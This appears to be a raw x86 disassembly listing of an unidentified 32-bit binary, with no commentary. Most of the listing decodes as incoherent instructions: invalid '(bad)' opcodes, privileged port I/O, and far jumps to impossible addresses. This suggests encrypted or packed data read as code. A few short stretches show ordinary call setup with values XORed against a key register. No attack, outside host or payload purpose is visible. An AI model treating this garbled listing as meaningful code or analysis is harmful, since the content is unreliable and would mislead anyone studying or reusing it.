  407afe:	cmp    al,BYTE PTR [ebp+eax*2+0x55]
  407b02:	or     esp,esi
  407b04:	or     ch,ch
  407b06:	jmp    FWORD PTR [esi+0x4c40971a]
  407b0c:	mov    DWORD PTR [edx-0x52],ecx
  407b0f:	fistp  QWORD PTR [eax-0x16]
  407b12:	addr16 xor al,0xb1
  407b15:	xor    eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	or     al,0x20
  407b41:	mov    ecx,0x70c957a8
  407b46:	jo     0x407b68
  407b48:	jge    0x407bba
  407b4a:	jo     0x407aef
  407b4c:	in     al,0x3c
  407b4e:	jno    0x407b0f
  407b50:	jno    0x407ba2
  407b52:	imul   esi,DWORD PTR [ebp-0x7b],0xffffff96
  407b56:	pop    edi
  407b57:	pusha  
  407b58:	xchg   ebx,eax
  407b59:	pop    edx
  407b5a:	dec    esp
  407b5b:	mov    BYTE PTR [ebx],0x23
  407b5e:	pop    esi
  407b5f:	and    BYTE PTR [eax+0x245439f4],ch
  407b65:	je     0x407bdd
  407b67:	dec    ecx
  407b68:	aas    
  407b69:	mov    al,0x5d
  407b6b:	jl     0x407b49
  407b6d:	add    BYTE PTR [ebp-0x78],ch
  407b70:	dec    esi
  407b71:	retf   
  407b72:	pop    esi
  407b73:	pusha  
  407b74:	test   BYTE PTR [ebx-0x19],cl
  407b77:	xor    ebx,DWORD PTR [ecx]
  407b79:	xor    eax,DWORD PTR [esi]
  407b7b:	les    edx,FWORD PTR [edx]
  407b7d:	sbb    ah,BYTE PTR gs:[ebx]
  407b80:	pop    edi
  407b81:	mov    fs,WORD PTR [edx+0x8]
  407b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b85:	neg    BYTE PTR [ecx+ebx*4+0x48]
  407b89:	pop    ss
  407b8a:	mov    ecx,DWORD PTR [edi+0x739cc71]
  407b90:	lods   eax,DWORD PTR ds:[esi]
  407b91:	mov    bl,0x37
  407b93:	push   ds
  407b94:	in     al,dx
  407b95:	les    esp,FWORD PTR [ebp-0x7a]
  407b98:	xor    BYTE PTR [edi],bh
  407b9a:	jbe    0x407b27
  407b9c:	cwde   
  407b9d:	xlat   BYTE PTR ds:[ebx]
  407b9e:	mov    dh,0x3e
  407ba0:	std    
  407ba1:	xchg   esi,eax
  407ba2:	out    dx,al
  407ba3:	add    edx,DWORD PTR [edx-0x18]
  407ba6:	or     eax,0x9d5660e1
  407bab:	aad    0x70
  407bad:	popf   
  407bae:	sbb    eax,0xc718b7ab
  407bb3:	fiadd  DWORD PTR [esi+0x78f69208]
  407bb9:	or     eax,0x9bcb30dc
  407bbe:	add    DWORD PTR [edx+ecx*4],ecx
  407bc1:	xor    dl,BYTE PTR [edx-0x19]
  407bc4:	out    dx,eax
  407bc5:	(bad)  
  407bc6:	repnz fsub DWORD PTR [edi+0x66]
  407bca:	fbstp  TBYTE PTR [edi+0x24687823]
  407bd0:	lmsw   WORD PTR [ebx]
  407bd3:	mov    ch,0xb3
  407bd5:	jno    0x407b63
  407bd7:	cmp    BYTE PTR [edi],0x3c
  407bda:	je     0x407b6b
  407bdc:	dec    ebx
  407bdd:	lea    ebp,[esi+0x6fa84219]
  407be3:	adc    eax,0x1e8de0fc
  407be8:	iret   
  407be9:	cwde   
  407bea:	xor    DWORD PTR [edi],ebx
  407bec:	stos   DWORD PTR es:[edi],eax
  407bed:	sbb    ah,BYTE PTR [ebp+0x4e43f3d2]
  407bf3:	hlt    
  407bf4:	xor    BYTE PTR [ebx-0x1a],bl
  407bf7:	or     eax,0x8f3d13a3
  407bfc:	push   ecx
  407bfd:	mov    esi,0x7cc0c1d6
  407c02:	xchg   edi,eax
  407c03:	or     ebx,DWORD PTR [eax]
  407c05:	inc    esi
  407c06:	clc    
  407c07:	mov    edi,0x6cc09018
  407c0c:	push   es
  407c0d:	retf   
  407c0e:	jae    0x407c0d
  407c10:	inc    esi
  407c11:	arpl   WORD PTR [ebx+0x47bedbe0],di
  407c17:	mov    esi,0xd83cfb93
  407c1c:	hlt    
  407c1d:	xchg   edi,eax
  407c1e:	or     ah,BYTE PTR [esi-0x41]
  407c21:	inc    edi
  407c22:	(bad)  
  407c23:	fcmovbe st,st(4)
  407c25:	arpl   WORD PTR [esi-0x28],cx
  407c28:	and    bh,bl
  407c2a:	cmp    esp,DWORD PTR [eax+0x48]
  407c2d:	imul   edi,DWORD PTR [eax+eiz*2-0x76],0x78
  407c32:	scas   eax,DWORD PTR es:[edi]
  407c33:	dec    ebx
  407c34:	xchg   edi,eax
  407c35:	lahf   
  407c36:	aad    0xe
  407c38:	or     esi,ebx
  407c3a:	ret    
  407c3b:	in     al,0x7b
  407c3d:	lea    esi,[eax+0x1]
  407c40:	cwde   
  407c41:	mov    ?,WORD PTR [ebx-0x80]
  407c44:	mov    ebx,0x704e1ac2
  407c49:	enter  0xbbea,0x8c
  407c4d:	scas   al,BYTE PTR es:[edi]
  407c4e:	sub    ecx,DWORD PTR [ebx-0x36d2386]
  407c54:	xor    edx,esi
  407c56:	push   ecx
  407c57:	pop    eax
  407c58:	xchg   ah,bh
  407c5a:	sbb    BYTE PTR [ebx-0x349cee04],dh
  407c60:	sti    
  407c61:	cmp    eax,0xdd9fadc7
  407c66:	lahf   
  407c67:	loope  0x407cbc
  407c69:	stos   DWORD PTR es:[edi],eax
  407c6a:	inc    esi
  407c6b:	retf   0x1782
  407c6e:	scas   al,BYTE PTR es:[edi]
  407c6f:	retf   
  407c70:	and    al,0x8f
  407c72:	jmp    0x407c4b
  407c74:	les    edx,FWORD PTR [edx]
  407c76:	mov    WORD PTR [ebx-0x4dedaae1],ds
  407c7c:	inc    edx
  407c7d:	ins    DWORD PTR es:[edi],dx
  407c7e:	icebp  
  407c7f:	push   cs
  407c80:	jp     0x407c89
  407c82:	push   cs
  407c83:	mov    cl,0x24
  407c85:	leave  
  407c86:	fs jbe 0x407c9b
  407c89:	mov    bh,0x92
  407c8b:	inc    ebx
  407c8c:	aad    0x78
  407c8e:	je     0x407cc6
  407c90:	xchg   cl,ch
  407c92:	sub    BYTE PTR ds:0x1f906288,dh
  407c98:	jp     0x407ca7
  407c9a:	cmp    dl,BYTE PTR [ebx+0x1d6cd322]
  407ca0:	cmp    al,0x79
  407ca2:	adc    al,0x8b
  407ca4:	cmp    BYTE PTR [ebx+ebp*2+0x53],bl
  407ca8:	sub    eax,0xf0d89023
  407cad:	je     0x407cca
  407caf:	xor    eax,0x66ba9469
  407cb4:	aam    0x20
  407cb6:	dec    eax
  407cb7:	pusha  
  407cb8:	call   0xc07e:0x33926d85
  407cbf:	jmp    0xddf787f8
  407cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cc5:	icebp  
  407cc6:	xchg   ebp,eax
  407cc7:	test   DWORD PTR [esi+0x6b],ecx
  407cca:	cmp    al,0xb5
  407ccc:	xchg   ecx,eax
  407ccd:	pusha  
  407cce:	fst    st(1)
  407cd0:	fadd   QWORD PTR [ecx]
  407cd2:	imul   esp,esp,0x5d
  407cd5:	scas   eax,DWORD PTR es:[edi]
  407cd6:	pop    edx
  407cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cd8:	sub    ch,BYTE PTR [ecx]
  407cda:	dec    ebx
  407cdb:	sbb    ch,BYTE PTR [edi]
  407cdd:	add    edx,esp
  407cdf:	hlt    
  407ce0:	pslld  mm1,QWORD PTR [esi+0x3cef17dd]
  407ce7:	and    al,0x61
  407ce9:	and    al,0x9c
  407ceb:	jmp    0x407cca
  407ced:	popa   
  407cee:	imul   BYTE PTR [ecx]
  407cf0:	jl     0x407cf6
  407cf2:	and    al,0x7d
  407cf4:	mov    DWORD PTR [ebx+eiz*4+0x154e39d5],eax
  407cfb:	mov    eax,edx
  407cfd:	int3   
  407cfe:	test   eax,0xa8edd6af
  407d03:	xchg   edx,eax
  407d04:	sub    al,0x4c
  407d06:	dec    edx
  407d07:	cmp    eax,0x8cdb9de9
  407d0c:	and    DWORD PTR [ebx+0x44ea0f48],ecx
  407d12:	shl    BYTE PTR [ebx-0x5e43a546],0xf3
  407d19:	add    al,0x3d
  407d1b:	outs   dx,DWORD PTR ds:[esi]
  407d1c:	(bad)  
  407d1d:	stc    
  407d1e:	sub    eax,0xef914c6a
  407d23:	imul   esp,DWORD PTR [edx+0x7d],0x53
  407d27:	sub    cl,dl
  407d29:	or     eax,0x1f122de6
  407d2e:	cs aaa 
  407d30:	fisub  WORD PTR [edx+0x1e]
  407d33:	ds push eax
  407d35:	sub    ah,0xcb
  407d38:	xlat   BYTE PTR ds:[ebx]
  407d39:	stc    
  407d3a:	ror    DWORD PTR [esi],0xfc
  407d3d:	test   eax,0xbf08de6c
  407d42:	mov    BYTE PTR [ebx-0x50],dl
  407d45:	mov    al,0x78
  407d47:	clc    
  407d48:	inc    edx
  407d49:	jmp    0xe508147c
  407d4e:	inc    eax
  407d4f:	cmc    
  407d50:	mov    ecx,ds
  407d52:	push   es
  407d53:	daa    
  407d54:	sbb    ah,bh
  407d56:	dec    ebp
  407d57:	push   ss
  407d58:	mov    bh,0x40
  407d5a:	stos   DWORD PTR es:[edi],eax
  407d5b:	cmp    DWORD PTR [eax+esi*8],0xffffffeb
  407d5f:	out    dx,al
  407d60:	rcr    DWORD PTR [edi+eax*4+0x68],1
  407d64:	mov    ebx,DWORD PTR [esi+ebp*1]
  407d67:	push   edi
  407d68:	xchg   esp,eax
  407d69:	and    al,0x9d
  407d6b:	(bad)  
  407d6c:	sub    ebx,DWORD PTR [eax+0x18]
  407d6f:	mov    ecx,0x604267a3
  407d74:	push   DWORD PTR [esi]
  407d76:	aaa    
  407d77:	adc    esp,DWORD PTR [eax+edx*8-0x1]
  407d7b:	(bad)  
  407d7c:	or     DWORD PTR [edx+0x78],edx
  407d7f:	adc    al,0x2a
  407d81:	cmc    
  407d82:	push   ebx
  407d83:	dec    esi
  407d84:	push   ecx
  407d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d86:	(bad)  
  407d87:	int3   
  407d88:	add    DWORD PTR [esi],esi
  407d8a:	cs test eax,0x97e40ab1
  407d90:	sub    BYTE PTR [esp+edi*2-0x3ed7143e],al
  407d97:	mov    dl,0xbd
  407d99:	dec    eax
  407d9a:	jmp    0xb422ecb9
  407d9f:	xchg   esp,eax
  407da0:	cmp    dl,0x7e
  407da3:	(bad)  
  407da4:	pop    edx
  407da5:	mov    ch,BYTE PTR [ecx]
  407da7:	sahf   
  407da8:	sbb    BYTE PTR [esi-0x32d5571c],bl
  407dae:	mov    edx,0x1ba29b38
  407db3:	push   ds
  407db4:	fiadd  WORD PTR [ecx+ebp*8]
  407db7:	dec    edx
  407db8:	add    ebx,DWORD PTR [eax-0x4e60a4dc]
  407dbe:	or     BYTE PTR [ebp+0x36],cl
  407dc1:	cmp    eax,0xed566365
  407dc6:	dec    ebx
  407dc7:	adc    al,0x83
  407dc9:	adc    al,BYTE PTR [edi+0x768c446f]
  407dcf:	fidivr DWORD PTR gs:[edi+ebp*2-0x27930285]
  407dd7:	sub    BYTE PTR [eax+0x7f],dh
  407dda:	icebp  
  407ddb:	jne    0x407e0f
  407ddd:	fild   WORD PTR [ebp-0x67]
  407de0:	fcom   DWORD PTR [esi]
  407de2:	and    ah,BYTE PTR ds:0x286e8e09
  407de8:	ja     0x407dcb
  407dea:	jge    0x407e1a
  407dec:	and    DWORD PTR [edi-0x2b],edi
  407def:	adc    eax,0x5eb3f367
  407df4:	sti    
  407df5:	out    0x34,eax
  407df7:	fdivr  DWORD PTR [edx]
  407df9:	push   0x1f6351d9
  407dfe:	adc    eax,0x6ee3bea1
  407e03:	shl    BYTE PTR [ebx],1
  407e05:	mov    ah,0x78
  407e07:	test   eax,0x46cb38ca
  407e0c:	mov    edi,0xa145d58d
  407e11:	pushf  
  407e12:	add    ebp,edi
  407e14:	not    DWORD PTR [edi]
  407e16:	xchg   ebx,eax
  407e17:	adc    ebx,0x5560b9aa
  407e1d:	xlat   BYTE PTR ds:[ebx]
  407e1e:	dec    esi
  407e1f:	xchg   edi,eax
  407e20:	jle    0x407e3a
  407e22:	stos   BYTE PTR es:[edi],al
  407e23:	in     al,0x3d
  407e25:	lods   eax,DWORD PTR ds:[esi]
  407e26:	and    bh,BYTE PTR [ebx-0x70]
  407e29:	jp     0x407ea3
  407e2b:	icebp  
  407e2c:	loope  0x407e87
  407e2e:	loope  0x407df2
  407e30:	xchg   esp,eax
  407e31:	xchg   DWORD PTR [ebp+0x63],ebp
  407e34:	(bad)  
  407e35:	sub    al,0xe2
  407e37:	xchg   ecx,eax
  407e38:	imul   ebp,DWORD PTR [esp+edi*8],0xfffffffb
  407e3c:	ret    0xfd06
  407e3f:	adc    DWORD PTR [ebp-0x3f9480fc],eax
  407e45:	pusha  
  407e46:	(bad)  
  407e47:	(bad)  
  407e48:	(bad)  
  407e49:	ror    BYTE PTR [esi+0x6f],0xf7
  407e4d:	mov    eax,ds:0xecf5f71c
  407e52:	rol    DWORD PTR ds:0x9961b12e,cl
  407e58:	bnd jnp 0x407ed5
  407e5b:	aaa    
  407e5c:	arpl   WORD PTR [edi+0x40f4bc1],si
  407e62:	adc    al,0xf0
  407e64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e65:	xchg   BYTE PTR [eax+0x324ff729],bl
  407e6b:	sub    DWORD PTR [ebx],0xffffffa3
  407e6e:	fs sub eax,0x899a984
  407e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e75:	dec    esi
  407e76:	les    sp,DWORD PTR [edi+0x3be8c5b9]
  407e7d:	mov    ds:0x45890000,al
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	or     eax,esp
  407e9a:	xor    ch,BYTE PTR [ebp+0x7]
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407f00
  407ea5:	pop    esp
  407ea6:	pop    ds
  407ea7:	cmp    BYTE PTR [edi+0x48],bh
  407eaa:	test   al,0x77
  407eac:	leave  
  407ead:	int3   
  407eae:	xor    BYTE PTR [eax-0x42],0x28
  407eb2:	push   ebx
  407eb3:	and    al,0xe4
  407eb5:	xchg   ebx,eax
  407eb6:	and    esi,ecx
  407eb8:	sub    WORD PTR [eax],bx
  407ebb:	test   DWORD PTR [edx],ebp
  407ebd:	jecxz  0x407e6e
  407ebf:	mov    ecx,0xa0a7ed5
  407ec4:	dec    edi
  407ec5:	cld    
  407ec6:	cs pop edi
  407ec8:	sar    DWORD PTR [eax],0xe7
  407ecb:	push   edi
  407ecc:	pusha  
  407ecd:	fwait
  407ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ecf:	dec    ecx
  407ed0:	adc    DWORD PTR [edx],ecx
  407ed2:	sub    esp,DWORD PTR [edx]
  407ed4:	inc    eax
  407ed5:	mov    al,al
  407ed7:	inc    edi
  407ed8:	sahf   
  407ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407eda:	data16 cmp dh,bh
  407edd:	jg     0x407e85
  407edf:	or     eax,0xd08ee37b
  407ee4:	fistp  WORD PTR [esi+0x7593f255]
  407eea:	sti    
  407eeb:	fldcw  WORD PTR [eax-0xc]
  407eee:	test   eax,0x14b6b730
  407ef3:	mov    al,0xe4
  407ef5:	cmp    BYTE PTR [ebx-0x37f6329d],0xac
  407efc:	mov    ah,0xbb
  407efe:	push   edx
  407eff:	sbb    al,BYTE PTR [ebp-0x1f]
  407f02:	xlat   BYTE PTR ds:[ebx]
  407f03:	push   0x16a532d9
  407f08:	popf   
  407f09:	mov    ebx,0xed5cf0f7
  407f0e:	mov    fs:0x3143d303,eax
  407f14:	jmp    0x407ea6
  407f16:	cs jmp 0x407ea7
  407f19:	cmp    al,0x64
  407f1b:	into   
  407f1c:	push   esi
  407f1d:	cdq    
  407f1e:	repz and al,0x62
  407f21:	mov    dh,0xc1
  407f23:	push   ebx
  407f24:	sti    
  407f25:	outs   dx,DWORD PTR ds:[esi]
  407f26:	xor    DWORD PTR [ebx-0x682d408e],edi
  407f2c:	push   es
  407f2d:	pop    esp
  407f2e:	cmp    al,0x7a
  407f30:	popf   
  407f31:	iret   
  407f32:	mov    edx,0x88b60e0
  407f37:	popf   
  407f38:	jae    0x407f8a
  407f3a:	in     eax,dx
  407f3b:	outs   dx,BYTE PTR ds:[esi]
  407f3c:	js     0x407fba
  407f3e:	mov    bh,0x85
  407f40:	hlt    
  407f41:	stos   DWORD PTR es:[edi],eax
  407f42:	cmp    al,0xbd
  407f44:	lds    ebp,FWORD PTR [esi-0x79344b1f]
  407f4a:	ss pop esp
  407f4c:	sbb    al,0x4c
  407f4e:	loopne 0x407f7b
  407f50:	mov    dl,0xbe
  407f52:	xor    BYTE PTR ds:0x85fe349a,0x19
  407f59:	bound  ebp,QWORD PTR [ecx+0x118f88f1]
  407f5f:	addr16 mov cl,dh
  407f62:	adc    eax,0x8c3f6904
  407f67:	sti    
  407f68:	jno    0x407fd5
  407f6a:	mov    ch,0x5a
  407f6c:	or     esp,DWORD PTR [edx-0x72]
  407f6f:	popf   
  407f70:	xchg   esi,eax
  407f71:	mov    bl,0xad
  407f73:	or     DWORD PTR [ecx-0x51],ebx
  407f76:	dec    ebp
  407f77:	test   al,0x8e
  407f79:	sub    al,0x4a
  407f7b:	jmp    0x407f8d
  407f7d:	std    
  407f7e:	adc    DWORD PTR [edx-0x772b1b42],edx
  407f84:	lods   al,BYTE PTR ds:[esi]
  407f85:	xchg   DWORD PTR [ebx+edi*4+0x39],ebp
  407f89:	mov    dl,0x1a
  407f8b:	inc    edx
  407f8c:	leave  
  407f8d:	lahf   
  407f8e:	mov    WORD PTR [ecx],es
  407f90:	in     al,dx
  407f91:	add    dl,BYTE PTR [eax]
  407f93:	cmp    esp,esi
  407f95:	dec    edi
  407f96:	fidiv  DWORD PTR [edi+0x7e513ffd]
  407f9c:	fldcw  WORD PTR [eax+0x6088c34]
  407fa2:	xor    DWORD PTR [eax],ecx
  407fa4:	inc    edx
  407fa5:	out    dx,eax
  407fa6:	popa   
  407fa7:	call   0x2fcff769
  407fac:	fidivr DWORD PTR [esi]
  407fae:	arpl   WORD PTR [ebx-0x19f2c2ad],dx
  407fb4:	xchg   esi,eax
  407fb5:	cmp    DWORD PTR [esi],esp
  407fb7:	add    al,0xca
  407fb9:	loopne 0x407fd0
  407fbb:	and    bh,bl
  407fbd:	daa    
  407fbe:	stc    
  407fbf:	xor    BYTE PTR [edx],bl
  407fc1:	in     al,0xb1
  407fc3:	cdq    
  407fc4:	adc    ah,cl
  407fc6:	mov    gs,WORD PTR [edi]
  407fc8:	xor    BYTE PTR [ebp+0x22],bl
  407fcb:	inc    ecx
  407fcc:	push   0x70
  407fce:	mov    es,WORD PTR [esi-0x79c0a9d1]
  407fd4:	icebp  
  407fd5:	les    esp,FWORD PTR [edx+0x150b4212]
  407fdb:	repz push esi
  407fdd:	mov    eax,0xb0b7f987
  407fe2:	clc    
  407fe3:	and    esp,DWORD PTR [esi+0xe214209]
  407fe9:	sbb    BYTE PTR [ecx+edx*4+0x156d3617],cl
  407ff0:	pop    ebx
  407ff1:	repz bound esi,QWORD PTR [ecx+0x61]
  407ff5:	retf   0xecd7
  407ff8:	or     eax,0x4178339f
  407ffd:	adc    cl,BYTE PTR [edi-0x5c]
  408000:	pop    edx
  408001:	mov    al,0xd8
  408003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408004:	pop    ss
  408005:	xchg   DWORD PTR [ecx+0x5d],ecx
  408008:	bound  edi,QWORD PTR [edi+0x5a]
  40800b:	sahf   
  40800c:	mov    BYTE PTR ds:0x935d3024,bh
  408012:	dec    eax
  408013:	jl     0x407fff
  408015:	out    0xa7,al
  408017:	repnz mov ds:0xd817d150,al
  40801d:	mov    al,ds:0xe980ddc0
  408022:	lods   eax,DWORD PTR ds:[esi]
  408023:	popa   
  408024:	sub    eax,0x866fd0f9
  408029:	and    dh,0xb2
  40802c:	mov    esp,0x15e90ca4
  408031:	bound  ecx,QWORD PTR [esi+0x6208cd93]
  408037:	add    bl,BYTE PTR [ecx-0x5c]
  40803a:	xor    al,0x78
  40803c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40803d:	imul   BYTE PTR [edi+0x7a]
  408040:	inc    ebp
  408041:	cdq    
  408042:	dec    edi
  408043:	fmul   DWORD PTR [edi+esi*8+0x34fb0917]
  40804a:	and    eax,0xdc15bd48
  40804f:	ins    DWORD PTR es:[edi],dx
  408050:	gs push eax
  408052:	dec    esi
  408053:	shl    DWORD PTR [eax-0x5b],1
  408056:	dec    eax
  408057:	dec    ebx
  408058:	inc    esp
  408059:	adc    eax,0xce78d11a
  40805e:	loopne 0x408074
  408060:	fidiv  WORD PTR [esi+ebx*2-0x47]
  408064:	test   cl,al
  408066:	lds    edx,FWORD PTR [esp+ebx*8-0x3abafe2d]
  40806d:	cld    
  40806e:	fsubr  st(2),st
  408070:	fs je  0x4080d7
  408073:	push   esp
  408074:	lds    eax,FWORD PTR gs:[ecx+0x66]
  408078:	mov    ch,0xf
  40807a:	sub    edx,DWORD PTR [ebx-0x60]
  40807d:	inc    ebx
  40807e:	mov    eax,es
  408080:	mov    ecx,?
  408082:	cmp    DWORD PTR [ecx],0x6be25407
  408088:	inc    ebp
  408089:	ins    BYTE PTR es:[edi],dx
  40808a:	adc    eax,0x9018b305
  40808f:	es pushf 
  408091:	xchg   esp,eax
  408092:	leave  
  408093:	rol    eax,cl
  408095:	jp     0x4080c1
  408097:	pusha  
  408098:	pop    esi
  408099:	sbb    cl,BYTE PTR [ecx-0x26b660df]
  40809f:	sub    ebp,edx
  4080a1:	stos   BYTE PTR es:[edi],al
  4080a2:	out    dx,al
  4080a3:	ins    BYTE PTR es:[edi],dx
  4080a4:	pop    edi
  4080a5:	int    0x4b
  4080a7:	lds    esp,FWORD PTR [ecx]
  4080a9:	pop    ss
  4080aa:	jo     0x408057
  4080ac:	in     al,0xea
  4080ae:	jnp    0x4080e1
  4080b0:	loopne 0x4080d0
  4080b2:	jb     0x4080d6
  4080b4:	cli    
  4080b5:	mov    BYTE PTR [edi+0x14],bh
  4080b8:	sbb    bl,BYTE PTR [ecx-0x42]
  4080bb:	ja     0x408104
  4080bd:	test   al,0x44
  4080bf:	push   edx
  4080c0:	inc    ecx
  4080c1:	outs   dx,BYTE PTR ds:[esi]
  4080c2:	call   0x5be5:0xfee44230
  4080c9:	jmp    0x1e13e43e
  4080ce:	test   eax,0x28786168
  4080d3:	add    BYTE PTR [ecx-0x5d],cl
  4080d6:	in     eax,dx
  4080d7:	mov    bl,0x8f
  4080d9:	and    al,bh
  4080db:	add    dh,BYTE PTR [ecx-0x26]
  4080de:	jnp    0x40812f
  4080e0:	ja     0x4080f4
  4080e2:	pop    esi
  4080e3:	stc    
  4080e4:	test   eax,ebp
  4080e6:	bound  edx,QWORD PTR [edi+esi*2]
  4080e9:	add    esp,ecx
  4080eb:	retf   
  4080ec:	pop    esp
  4080ed:	sbb    dh,BYTE PTR [ebp-0x53]
  4080f0:	adc    DWORD PTR [ecx-0x43],ebx
  4080f3:	mov    ds:0x102a562b,al
  4080f8:	pop    ebp
  4080f9:	ss jne 0x4080f8
  4080fc:	and    ecx,eax
  4080fe:	bound  eax,QWORD PTR [edi]
  408100:	into   
  408101:	ret    
  408102:	jnp    0x4080ea
  408104:	call   DWORD PTR [eax+ebp*2-0xe]
  408108:	cmp    eax,DWORD PTR [ebp+0x4959b217]
  40810e:	xor    al,0x8c
  408110:	fiadd  DWORD PTR [ecx+0x3e35cb2e]
  408116:	outs   dx,DWORD PTR ds:[esi]
  408117:	mov    gs,eax
  408119:	fst    st(6)
  40811b:	(bad)
  40811e:	jp     0x408159
  408120:	add    al,0xd3
  408122:	mov    cl,0x52
  408124:	adc    al,0x7b
  408126:	mov    eax,ds:0xa6a63ceb
  40812b:	int    0x16
  40812d:	jbe    0x408119
  40812f:	mov    WORD PTR [esi-0x37c71908],gs
  408135:	je     0x408107
  408137:	jl     0x40817e
  408139:	jle    0x4080dc
  40813b:	repnz icebp 
  40813d:	pop    edx
  40813e:	jmp    0x7e9a:0x35c02bef
  408145:	pop    ebp
  408146:	loopne 0x4080d1
  408148:	sbb    ebx,DWORD PTR [eax+0x6f4221e8]
  40814e:	jl     0x4080f4
  408150:	pop    ebp
  408151:	(bad)  
  408152:	not    ecx
  408154:	add    al,0xaf
  408156:	xchg   ebp,eax
  408157:	sub    BYTE PTR [eax+0x48226ee],ah
  40815d:	(bad)  
  40815e:	subps  xmm2,XMMWORD PTR [ebp+0x44]
  408162:	sbb    BYTE PTR [ebx-0x5a],bl
  408165:	in     eax,0x11
  408167:	not    esi
  408169:	int    0x70
  40816b:	xor    al,0xc7
  40816d:	sahf   
  40816e:	inc    ebp
  40816f:	jle    0x408109
  408171:	mov    eax,ds:0x25974fa2
  408176:	push   edx
  408177:	imul   esp,DWORD PTR [esi+0xe1f25e0],0x23f0e5f1
  408181:	push   esp
  408182:	aam    0x50
  408184:	fs push ecx
  408186:	mov    ch,0xee
  408188:	xor    BYTE PTR [ebp-0x2c],bh
  40818b:	or     eax,0x190e6957
  408190:	arpl   WORD PTR [edi+0x6efae284],dx
  408196:	and    DWORD PTR cs:[edi],ecx
  408199:	iret   
  40819a:	scas   al,BYTE PTR es:[edi]
  40819b:	sub    cl,BYTE PTR [edx-0x56dc51fe]
  4081a1:	fucomp st(3)
  4081a3:	jbe    0x408191
  4081a5:	add    eax,0x9fb21021
  4081aa:	sar    BYTE PTR [esi-0x57],0x92
  4081ae:	daa    
  4081af:	or     eax,0x397cbda7
  4081b4:	inc    esp
  4081b5:	xlat   BYTE PTR ds:[ebx]
  4081b6:	xor    dl,BYTE PTR [ecx]
  4081b8:	retf   0xc302
  4081bb:	add    ebp,edi
  4081bd:	mov    BYTE PTR [esi+edi*4+0x36],cl
  4081c1:	stos   BYTE PTR es:[edi],al
  4081c2:	jne    0x4081d4
  4081c4:	clc    
  4081c5:	stos   DWORD PTR es:[edi],eax
  4081c6:	mov    bl,0x48
  4081c8:	stos   BYTE PTR es:[edi],al
  4081c9:	(bad)  
  4081ca:	pop    edx
  4081cb:	mov    bh,0x12
  4081cd:	sub    cl,BYTE PTR [eax-0x7a]
  4081d0:	cs dec eax
  4081d2:	sbb    al,0xe2
  4081d4:	lea    eax,[ebp+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	mul    DWORD PTR [edx+0x57]
  40826b:	push   0x37
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x4082c0
  408275:	sbb    eax,0xb691f020
  40827a:	pop    edx
  40827b:	sti    
  40827c:	inc    edi
  40827d:	push   ds
  40827e:	sbb    eax,0x31cb6c59
  408283:	mov    dl,0xf8
  408285:	mov    edi,0xfda9d323
